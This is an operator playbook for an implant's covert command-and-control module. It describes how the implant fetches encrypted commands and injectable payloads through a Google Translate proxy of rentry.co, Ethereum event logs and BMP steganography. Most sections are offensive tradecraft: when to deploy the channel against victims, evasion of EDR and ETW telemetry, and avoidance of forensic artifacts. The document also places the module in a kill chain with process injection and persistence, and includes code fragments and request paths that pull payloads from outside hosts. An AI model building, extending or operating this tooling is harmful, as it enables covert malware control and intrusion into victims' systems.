# Edo Dead Drop (Autonomous C2 Channels) — Operator Playbook

## TL;DR
Edo Dead Drop turns `crowd.exe` into a self-sufficient loader: it pulls encrypted commands/payloads from three covert channels (Google Translate proxy of `rentry.co`, Ethereum `eth_getLogs` on Sepolia, and LSB-steganographic BMP images) without ever touching the primary RAVEN server. All three channels terminate in `crate::crypto::decrypt_and_decompress` (AES-256-GCM + zstd), and decoded `INJECT|STEGO|DOWNLOAD` commands funnel payloads straight into crowd's existing injection stack — turning a dead drop into a staged loader.

## Source File Map

| File | Role | Key Exports | Size |
|---|---|---|---|
| `dark_crystal/crowd/src/edo_dead_drop.rs` | All three dead-drop channels + WinHTTP transport + BMP LSB parser + command protocol | `is_enabled()`, `poll_once()`, `stego_extract()`, `download_raw()`, `jittered_interval()`, `EdoCommand` | ~25K, single self-contained module |

The file is deliberately monolithic — there is no separate "channel trait" abstraction. Each channel is a free `fn` returning `Result<Vec<u8>>` (or `Vec<Vec<u8>>` for blockchain), glued together by `poll_once()`. This keeps the binary footprint small and avoids vtable artifacts.

## How It Works

### Channel 1 — Google Translate + Rentry (read-only primary)
1. `is_enabled()` (L84) gates the whole subsystem: requires `EDO_DROP_ENABLED` truthy AND (`EDO_DROP_GT_SLUG` non-empty OR `EDO_DROP_CONTRACT_ADDR` non-empty) AND `EDO_DROP_AES_KEY` not all-zero (misconfig guard).
2. `poll_once()` (L93) checks `EDO_DROP_GT_SLUG` and calls `poll_gtranslate_rentry(slug)` (L185).
3. `poll_gtranslate_rentry()` constructs path `/translate?sl=ja&tl=en&u=https://rentry.co/{slug}` and issues `winhttp_get(GT_HOST, &path, 443, true)` — the TLS terminator is Google, not rentry.co.
4. `parse_gt_html()` (L198) calls `find_subsequence()` to locate `MARKER_BEGIN` (`---EDO_BEGIN---`) and `MARKER_END` (`---EDO_END---`), slices the middle, then **filters with `is_ascii_hexdigit()`** to strip any HTML entities/whitespace Google Translate injects. Result is `hex_decode_bytes()`-ed to raw ciphertext.
5. Ciphertext flows into `decrypt_and_parse()` (L381) → `crate::crypto::decrypt_and_decompress(data, &EDO_DROP_AES_KEY, 0)` → `parse_commands()`.

### Channel 2 — Ethereum Sepolia logs (fallback)
6. On GT failure/empty, `poll_once()` falls through to `poll_blockchain()` (L220) if `EDO_DROP_CONTRACT_ADDR` and `EDO_DROP_RPC_URLS` are non-empty.
7. `poll_blockchain()` iterates `EDO_DROP_RPC_URLS` (a slice) and calls `eth_get_logs()` per URL; first success breaks the loop.
8. `eth_get_logs()` (L240) issues a `POST` with a hand-built JSON body: `{"jsonrpc":"2.0","method":"eth_getLogs","params":[{"address":"<contract>","topics":["<MSG_EVENT_TOPIC>"],"fromBlock":"latest"}],"id":1}`. The topic hash `0xafb4ccb78f1474d274fbc1448b20a17655e2da57d1dd99bb0aa2e5adcb4e80df` is the keccak256 of the `Message(...)` event ABI.
9. `parse_eth_logs()` (L256) does **manual JSON string-scraping** (no `serde_json` — keeps the dep tree small). It walks the response looking for the substring `"data":"0x`, then performs ABI-bytes decoding: skip the first 64 hex chars (offset pointer), read the next 64 hex chars as the data length, then slice that many bytes of hex.
10. Each decoded bytes blob is pushed to a `Vec<Vec<u8>>` and passed back through `decrypt_and_parse()` per-message.

### Channel 3 — LSB Steganography (payload delivery, on-demand)
11. Triggered only when an `EdoCommand::StegoLoad { url }` or `EdoCommand::Download { url }` is received from channels 1 or 2. (Note: a `Download` skips LSB and goes straight to `download_raw()`.)
12. `stego_extract(url)` (L139) calls `parse_url()`, fetches the image via `winhttp_get()`, then `extract_lsb_from_bmp()`, then `crate::crypto::decrypt_and_decompress()`.
13. `extract_lsb_from_bmp()` (L296) is a **pure-Rust native BMP parser** (no GDI+/WIC dependency):
 - Validates `BMP_MAGIC == 0x4D42` ("BM")
 - Reads `pixel_offset` from offset 10, `width` from 18, signed `height` from 22 (negative = top-down), `bpp` from 28
 - Accepts only 24- or 32-bpp; computes `bytes_per_pixel = bpp/8`
 - Computes 4-byte-aligned `row_stride = ((width * bpp/8 + 3) / 4) * 4`
 - For each pixel extracts `r&1`, `g&1`, `b&1` (BMP stores BGR(A), so the code reads `data[px_off+2]` for R, etc.)
 - First 32 bits (LSB-first, LE u32) = payload length
 - Caps at 100 MiB to prevent OOM DoS
 - Reassembles payload bytes bit-by-bit
14. Final ciphertext decrypted via `crate::crypto::decrypt_and_decompress(raw_payload, &EDO_DROP_AES_KEY, 0)`.

### Command protocol
15. `parse_commands()` (L391) expects newline-delimited text in the form `CMD|arg1|arg2` (max 3 fields via `splitn(3, '|')`). `#` lines are comments, blank lines skipped, command names uppercased.
16. Recognized verbs: `EXEC`/`CMD`, `INJECT` (with optional method), `STEGO`/`STEGO_LOAD`, `DOWNLOAD`/`DL`, `SLEEP`, `CONFIG`, `KILL`, `PING`. Unknown verbs are logged and skipped (lenient parsing — keeps the implant alive on protocol drift).

### Transport layer
17. `load_winhttp()` (L478) dynamically resolves `winhttp.dll` via `LoadLibraryA` and pulls 9 entry points via `GetProcAddress`. The macro `get!()` (L485) wraps the null-check + transmute pattern.
18. `winhttp_request()` (L525) builds a full session→connect→request→send→receive→close pipeline. Notable flags: `WINHTTP_ACCESS_TYPE_NO_PROXY` (no IE proxy reuse, no PAC artifacts), `WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE` for HTTPS, `Content-Type: application/json` added via `WinHttpAddRequestHeaders` only when `body` is non-empty.
19. Response is read in 8 KiB chunks with a hard 50 MB ceiling to prevent memory blowups.
20. `pick_user_agent()` (L506) and `jittered_interval()` (L168) both use `core::arch::asm!("rdtsc", out("eax") lo, out("edx") _)` for entropy — no `rand` crate, no `SystemFunction036`, no heap allocations. UA pool has 4 entries including the evasive `Microsoft-CryptoAPI/10.0` string that blends with OS noise.

## Code Architecture

```

### Data flow
- Compile-time config (`payload_cfg`) → constants `EDO_DROP_*` → gating in `is_enabled()` and `poll_once()`.
- Channel bytes (hex / ABI / LSB-extracted) → `decrypt_and_parse()` → `EdoCommand` enum → caller (presumably the FSM in `crowd/src/fsm.rs` or `edo_tensei.rs`).
- Stego/Download commands produce **raw decrypted bytes** returned to the caller, which feeds them into the injection suite (T-007 family) per the docstring claim "crowd injects it into a target process using its existing technique stack".

### Type hierarchy
- `EdoCommand` — 8-variant enum, no associated data on `Kill`/`Ping`, struct-variant fields on the rest.
- `WinHttp` — struct of 9 raw `extern "system" fn` pointers (not `windows_targets::link!` — manual load to avoid IAT entries pointing at `winhttp.dll`).
- Function-pointer type aliases (`WinHttpOpenFn`, etc.) all use `extern "system"` (Win32 ABI).

### Feature gates / cfg
- `#![allow(dead_code)]` at top — entire module compiles even if no caller invokes it; the build-time gate is `EDO_DROP_ENABLED` in `payload_cfg`, evaluated at runtime in `is_enabled()`.
- No `#[cfg(feature =...)]` inside this file — the module is always compiled into `crowd` and dead-stripped by the linker if `is_enabled()` is false at every call site.

## Operational Profile

### When to Use
- **Burned infrastructure**: primary RAVEN C2 down or burnt by threat intel feed — dead drop keeps the implant responsive.
- **Air-gapped victim with internet egress only to CDNs**: Google Translate TLS hostname is on every allow-list; the rentry.co content rides underneath.
- **Long-dwell engagements**: blockchain logs are immutable history — you can drop a command today, the implant reads it tomorrow on next poll.
- **Serverless red team**: you don't want to stand up any team-server IP that customer SOC can attribute.

### When NOT to Use
- **High-throughput exfil**: this is **inbound** C2 only. `EdoCommand` has no `Exfil` variant — outputs would need a separate channel. (The blockchain `eth_sendRawTransaction` is documented in the card but not implemented in this file — write-path is TODO.)
- **Closed networks**: no internet, no blockchain RPC, no Google — dead drop is dead.
- **Strict DLP environments with TLS interception**: GT requests will be intercepted; the `---EDO_BEGIN---` markers in cleartext hex will trip generic DLP regexes if you don't pre-encrypt with a different scheme.
- **Victim behind HTTPS-MITM proxy that injects content**: `parse_gt_html()`'s `is_ascii_hexdigit()` filter is robust to entity injection but **not** to body truncation.

### Kill Chain Position
This is a **late-stage persistence/resilience** node, not initial access.

```
T-004 (PEB walk) → T-002 (Hells Gate) → T-001 (RecycledGate)
 → T-012 (Early Cascade injection) → T-005 (Ekko sleep)
 → T-017 (Five-Layer Persistence) → T-018 (Edo Tensei resurrection)
 → T-019 (Edo Dead Drop) ← you are here
 → T-007 family (re-inject delivered payloads)
```

It is intentionally downstream of T-018 Edo Tensei — the docstring at L1-L25 calls this "Autonomous C2 for Edo Tensei" and notes "channel state persisted in soul storage (same backends as Edo Tensei)". T-018 revives the implant; T-019 gives the revived instance a way to fetch new work.

## Rust Implementation Deep Dive

### `unsafe` blocks (5 total)

1. **`jittered_interval()` L168-L181** — inline `rdtsc` via `core::arch::asm!`. Reads TSC into `eax`/`edx`, discards `edx`, takes `lo % (JITTER*2) - JITTER` as a signed offset. Falls back to 5000 ms minimum to prevent zero-or-negative sleeps. **Purpose**: avoid deterministic polling cadence without pulling in a CSPRNG.

2. **`load_winhttp()` L478-L504** — `unsafe` because of `LoadLibraryA`, `GetProcAddress`, and `std::mem::transmute` to function-pointer types. The macro `get!()` (L485) does `concat!($name, "\0").as_ptr() as _` to produce null-terminated names. **Purpose**: resolve 9 WinHTTP entry points without linking `winhttp.dll` import descriptor — keeps it out of the IAT.

3. **`pick_user_agent()` L506-L515** — second `rdtsc` asm. **Purpose**: index `USER_AGENTS` pseudo-randomly per request. No `unsafe` needed beyond the asm.

4. **`winhttp_request()` L525-L580** — the big one. All WinHTTP FFI calls (`(wh.open)(...)`, `(wh.connect)(...)`, etc.) are `unsafe` because the function pointers came from `GetProcAddress` and have no static type guarantees. Handles are closed in error paths with explicit `(wh.close)(req); (wh.close)(conn); (wh.close)(sess);` — no RAII guard, so leaks are possible if a panic occurs between calls. **Memory layout**: `body_ptr` is `body.as_ptr() as *mut _` — note the cast to `*mut` even though `body` is `&[u8]` (immutable). This is safe only because WinHTTP does not actually mutate the buffer, but it is a code smell.

5. **No other `unsafe`** in the BMP parser or hex decoder — they are pure safe Rust operating on byte slices.

### `core::arch::asm!` patterns
Both invocations share the identical constraint set:
```rust
std::arch::asm!("rdtsc", out("eax") lo, out("edx") _,);
```
- No clobbers listed (RDTSC clobbers `eax` and `edx`, both declared as outputs).
- No `options(att_syntax)` — default Intel syntax.
- No `preserves_flags` (RDTSC does not touch flags).
- Calling convention is irrelevant — it's inline asm, not a call.
- Pattern is **deterministic per-CPU** (same core, same TSC) but **sufficient** for UA rotation and jitter because the operator only needs unpredictability, not cryptographic randomness.

### FFI patterns
- **Handle ownership**: manual, not RAII. `winhttp_request()` cleans up on each error branch with `(wh.close)(X);` calls. If a panic happened between `WinHttpOpen` and `WinHttpConnect`, the session handle leaks. There is **no `Drop` guard** wrapping `HINTERNET`. An operator modifying this code should add a `struct WinHandle(HINTERNET); impl Drop for WinHandle {... }`.
- **`wide()` helper** (L517): builds a UTF-16 `Vec<u16>` with a NUL terminator via `OsStr::encode_wide().chain(Some(0))`. Standard Windows FFI idiom.
- **Function pointer struct**: `WinHttp { open, connect,... }` is a value-type Vtable. Not `dyn Trait`, not generic — plain struct fields. This is faster than vtable dispatch and avoids RTTI.

### Initialization patterns
- `payload_cfg` constants are imported at the top (L23-L29) via `pub use crate::payload_cfg::*`. These are `const` values baked at build time from YAML — **no `OnceLock`/`LazyCell`** here because nothing is resolved at runtime. The whole module is statically configured.
- No global mutable state. Every function is a pure transformation of its arguments plus the build-time constants. This is friendly to `no_std`-ish contexts and to EDR hook-scanning that looks for writable globals.

### Error handling
- `anyhow::Result` throughout. Errors are propagated up with `?`. No custom error enum — keeps the binary small.
- `mega_dbg!()` (from `crate`) is used in `poll_once()` to log channel errors without aborting the cascade. **Crucially**: a failure on channel 1 does NOT prevent channel 2 from running. This is the resilience design.
- `parse_commands()` is **lenient** — unknown verbs are logged and skipped, not error-returning. This means a malformed line in a dead-drop message does not poison the entire batch.
- `extract_lsb_from_bmp()` has 6 distinct early-return error paths (size, magic, bpp, truncation, header-too-small, payload-too-large). The 100 MB cap at L370 prevents OOM via malicious length headers.

### Memory layout
- `EdoCommand` enum: 8 variants. `Kill` and `Ping` are unit variants; the rest are struct variants. The enum size is dominated by the largest variant (`Inject { url: String, method: Option<String> }` = 24 (String) + 24 (Option<String>) + discriminant = ~56 bytes on x64). `Vec<EdoCommand>` is heap-allocated with `Vec::new()` in `poll_once()` and `parse_commands()` — no preallocation.
- `WinHttp` struct: 9 function pointers × 8 bytes = 72 bytes. Lives on the stack in `winhttp_request()` via `load_winhttp()?`.
- `bits: Vec<u8>` in `extract_lsb_from_bmp()` is the **memory hog** — one byte per bit, so a 1920×1080 24-bpp image produces ~6.2 MB of `Vec<u8>` just for the bit buffer. An operator concerned about memory traces should pack bits into `Vec<u8>` (8 bits per byte) — 8× reduction. This is a clear refactor candidate.

### Syscall numbers
- None directly. This module uses WinHTTP (user-mode HTTP stack) via dynamically-loaded function pointers. No `ntdll` syscalls are issued here. The "syscall" footprint of this module is whatever WinHTTP issues internally (e.g., `NtDeviceIoControlFile` to `HTTP.sys` or `AFD.sys`).
- However: the module's runtime cost includes `LoadLibraryA` → `ntdll!LdrLoadDll` and `GetProcAddress` → `ntdll!LdrGetProcedureAddress`. If the operator has T-009 Block-DLL or T-016 Block-DLL policy active, **winhttp.dll must be in the loader blocklist exception list** or this module fails at `load_winhttp()`.

**Notable absence**: there is **no direct call** to any injection module in this file. The dispatch is implicit — `EdoCommand` is returned to the caller, which (per the docstring) is responsible for routing payloads into the injection suite. This decoupling means T-019 can be tested in isolation.

## Edge Cases & Failure Modes

1. **All-zero AES key (build misconfiguration)**
 - Code path: `is_enabled()` L84-L91 explicitly checks `EDO_DROP_AES_KEY.iter().all(|&b| b == 0)` and returns false.
 - Symptom: `poll_once()` never called by the FSM; no network traffic; no telemetry.
 - Workaround: rebuild with non-zero key in `payload_cfg`.

2. **Google Translate returns no markers or wraps markers in HTML entities**
 - Code path: `parse_gt_html()` L198-L211. The `is_ascii_hexdigit()` filter strips everything except `[0-9a-fA-F]`, including `&quot;` entities. **However**, if GT splits the hex across multiple DOM text nodes with intervening tags (e.g., `<wbr>`), the contiguous `find_subsequence()` on `MARKER_BEGIN`/`MARKER_END` will still succeed, but the slice between them may include non-hex bytes which get filtered out — **silently producing wrong-length hex**.
 - Symptom: `hex_decode_bytes()` returns `Err("odd hex length")` if filtering removed an odd number of bytes; channel reports `GT decrypt/parse failed`.
 - Workaround: ensure server-side encoder pads hex to even length after any HTML-stripping risk. No client-side fix in current code.

3. **`eth_getLogs` returns logs with `data` shorter than 128 hex chars**
 - Code path: `parse_eth_logs()` L256-L289 has `if hex_str.len() >= 128` guard. Short logs are **silently skipped**.
 - Symptom: a `Message` event emitted with empty calldata is invisible to the parser — no error, no command. If the operator uses such events as pings, they will be missed.
 - Workaround: emit a dummy non-empty payload from the contract.

4. **`eth_getLogs` response contains nested `"data":"0x..."` strings inside a string field**
 - Code path: `parse_eth_logs()` uses naive substring search `"data":"0x`. If a contract emits an event whose string parameter contains the literal substring `"data":"0x`, it will be misparsed as a log entry.
 - Symptom: spurious command attempts, decryption failures (logged, skipped).
 - Workaround: none in current code — would require a real JSON parser.

5. **BMP `height` is negative (top-down)**
 - Code path: `extract_lsb_from_bmp()` L327-L328 correctly handles `bottom_up = height > 0` and `abs_height = height.unsigned_abs()`. **Correctly implemented** — this is a footgun that the code avoids.
 - Symptom: works as expected.

6. **BMP is 16-bpp or 8-bpp indexed**
 - Code path: `extract_lsb_from_bmp()` L326-L329 rejects `bpp != 24 && bpp != 32` with explicit error.
 - Symptom: `EdoCommand::StegoLoad` returns `Err("unsupported BMP bpp")`. The command is dropped.
 - Workaround: re-encode the carrier image as 24-bpp RGB before embedding.

7. **LSB payload length header claims > 100 MB**
 - Code path: L370-L372 caps at `100 * 1024 * 1024`.
 - Symptom: `Err("LSB payload too large")` even if the image is large enough.
 - Workaround: re-chunk the payload across multiple carrier images, or raise the cap (operator's choice — 100 MB is conservative).

8. **WinHTTP response body exceeds 50 MB**
 - Code path: `winhttp_request()` L566 silently breaks the read loop.
 - Symptom: truncated response, downstream parse fails with a confusing error.
 - Workaround: stream to disk (breaks "no temp files" OPSEC) or raise the cap.

9. **All RPC URLs in `EDO_DROP_RPC_URLS` are down**
 - Code path: `poll_blockchain()` L220-L235 `continue`s on each error and returns an empty `Vec` if all fail.
 - Symptom: `poll_once()` returns `None`. Silent — no error escalation.
 - Workaround: FSM should count consecutive `None` polls and trigger fallback behaviour.

10. **`parse_url()` given URL without scheme**
 - Code path: L588-L595 defaults to HTTPS. **However**, `host_port.rfind(':')` will pick the first `:` from the right, which is correct for IPv4 hosts but **wrong for IPv6 literals** (e.g., `[::1]:8080` — rfind returns the position of `8080`, but the host is parsed as `[::1]` with a leading `[`).
 - Symptom: `WinHttpConnect` fails with invalid hostname.
 - Workaround: avoid IPv6 RPC URLs in `payload_cfg`, or fix `parse_url()` to bracket-strip IPv6 literals.

## OPSEC Notes

### Artifacts left
- **Network**: outbound HTTPS to `translate.google.com:443`, `<rpc>.infura.io`/`<rpc>.alchemy.com`/Sepolia gateways, and the LSB image URL host. All TLS — content is opaque to NIDS.
- **DNS**: resolver cache will show `translate.google.com` and the RPC host. Google DNS is on every allow-list; RPC host depends on operator choice.
- **No file system artifacts**: WinHTTP is used (not WinINet), so no `History.IE5`, no `WebCacheV01.dat` entries, no `index.dat`. Confirmed by `WINHTTP_ACCESS_TYPE_NO_PROXY` flag.
- **No registry artifacts**: zero registry writes in this file.
- **No process artifacts**: no `CreateProcess`, no `CreateRemoteThread`. Pure network I/O.
- **Memory**: `Vec<EdoCommand>` returned to caller; `bits: Vec<u8>` (potentially multi-MB) is dropped when `extract_lsb_from_bmp()` returns. Decrypted plaintext bytes are owned by the caller — **the operator must ensure the caller zeros them** after injection. Currently no `zeroize` crate usage.

### Telemetry
- **ETW `Microsoft-Windows-WinHTTP`**: this is the primary signal. WinHTTP writes to this ETW provider for every request. T-009 ETW muffling (via `ntdll!EtwEventWrite` patch) must be applied **before** the first `poll_once()` call, or the first request leaks.
- **ETW `Microsoft-Windows-DNS-Client`**: every DNS lookup for `translate.google.com`, the RPC host, and the image host is logged.
- **Sysmon Event ID 22 (DNS)**: if Sysmon DNS logging is configured, all three hostnames appear.
- **ETW `Microsoft-Windows-Kernel-Network`**: TCP connect events to port 443.
- **EDR network inspection**: EDRs that intercept HTTPS (e.g., Cisco AMP for Endpoints with TLS-MITM) can see the rentry.co URL **inside** the Google Translate wrapper because GT issues a redirect that the implant ignores — but the GET URL `translate?...u=https://rentry.co/{slug}` is in **plaintext inside the TLS handshake SNI?** No — SNI is `translate.google.com`. The rentry.co URL is in the **HTTP request path inside the TLS tunnel**. So only with TLS-MITM does the URL leak.

### Cleanup
- No explicit cleanup code in this module. Memory is freed by Rust's drop semantics.
- For full OPSEC, the caller should call `crate::crypto::zeroize(&plaintext)` after consuming the payload — **not currently done**, identified as a refactor target.

## Reusable Patterns

### Pattern: Multi-Channel Fallback Cascade
- **Use when**: you have N independent covert channels and want graceful degradation.
- **Code ref**: `edo_dead_drop.rs:poll_once()` L93-L137
- **How**: each channel is a free `fn` returning `Result<Vec<u8>>`. The cascade calls them in order, breaks on first non-empty success, logs-but-continues on error. The pattern avoids `enum ChannelVariant` + vtables, keeping the binary small. Critical detail: **errors do not abort the cascade**, only empty successes do.

### Pattern: Compile-Time Config Gating Without `cfg`
- **Use when**: you want to ship a single binary that does or doesn't run a subsystem based on embedded config.
- **Code ref**: `edo_dead_drop.rs:is_enabled()` L84-L91
- **How**: `payload_cfg` exposes `const EDO_DROP_ENABLED: bool` baked from YAML at build time. The runtime check `if EDO_DROP_ENABLED &&...` lets the linker dead-strip the unused branch if the const is `false`. No `#[cfg(feature)]` needed; no feature unification issues across crates in the workspace.

### Pattern: `LoadLibraryA` + `GetProcAddress` Vtable Struct
- **Use when**: you need to call a DLL that you don't want in your IAT.
- **Code ref**: `edo_dead_drop.rs:load_winhttp()` L478-L504 + `WinHttp` struct L462-L472
- **How**: define a struct of function-pointer type aliases (`type WinHttpOpenFn = unsafe extern "system" fn(...) -> HINTERNET`). `load_winhttp()` populates it via a `get!()` macro that wraps `GetProcAddress` + `transmute`. The struct is returned by value (72 bytes on x64) and lives on the stack of the caller. **Caveat**: no RAII — the loaded DLL handle is never `FreeLibrary`-ed (intentional, since we'll call it again).

### Pattern: RDTSC-Seeded Pseudo-Randomness
- **Use when**: you need non-deterministic per-call selection without `rand`/`getrandom`/CSPRNG.
- **Code ref**: `edo_dead_drop.rs:pick_user_agent()` L506-L515 and `jittered_interval()` L168-L181
- **How**: `core::arch::asm!("rdtsc", out("eax") lo, out("edx") _);` reads the timestamp counter. For index selection: `lo as usize % N`. For signed jitter: `(lo as u64) % (JITTER*2) - JITTER`. The distribution is biased (low bits of TSC are correlated with bus clock), but for UA rotation and ±N ms jitter the bias is irrelevant.

### Pattern: Marker-Delimited Covert Content in Hostile HTML
- **Use when**: your data must survive transport through a system that may inject HTML entities, whitespace, or wrap your text in DOM.
- **Code ref**: `edo_dead_drop.rs:parse_gt_html()` L198-L211
- **How**: pick unique, unlikely-to-collide byte markers (`---EDO_BEGIN---` / `---EDO_END---`). Slice between them. Then filter the slice with a character-class predicate (`is_ascii_hexdigit`) to strip all injected noise. Finally, hex-decode. The filter-then-decode order is critical — direct hex-decode would fail on any non-hex byte.

### Pattern: Manual JSON Field Scrape
- **Use when**: you need one field out of a JSON response and don't want to pull `serde_json` (binary size, compile time).
- **Code ref**: `edo_dead_drop.rs:parse_eth_logs()` L256-L289
- **How**: walk the UTF-8 string with `&json_str[search_from..].find("\"data\":\"0x")`, update `search_from` to skip past the match. Extract the hex substring, then perform ABI-aware decoding (skip offset, read length, slice data). **Trade-off**: fragile to nested string fields containing the same key. Acceptable for tightly-controlled JSON-RPC responses.

### Pattern: Native BMP Parser for Carrier Images
- **Use when**: you need to read a BMP and don't want a WIC/GDI+/`image`-crate dependency.
- **Code ref**: `edo_dead_drop.rs:extract_lsb_from_bmp()` L296-L376
- **How**: hardcode the header offsets (`BMP_MAGIC`, `BMP_OFFSET_OFF=10`, `BMP_WIDTH_OFF=18`, `BMP_HEIGHT_OFF=22`, `BMP_BPP_OFF=28`). Validate magic, read fields via `u32::from_le_bytes` / `u16::from_le_bytes` / `i32::from_le_bytes`. Compute row stride with `((width * bytes_per_pixel + 3) / 4) * 4` for 4-byte alignment. Handle `height < 0` (top-down) and `height > 0` (bottom-up) by computing `actual_row = if bottom_up { abs_height - 1 - row_idx } else { row_idx }`. Extract `r&1, g&1, b&1` per pixel — note BMP stores as **BGR**, so `data[px_off+2]` is R, not `data[px_off]`.
